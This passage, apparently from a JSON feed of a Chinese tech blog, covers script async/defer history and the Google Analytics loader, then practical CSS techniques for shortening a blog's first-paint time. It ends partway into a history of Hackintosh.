的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 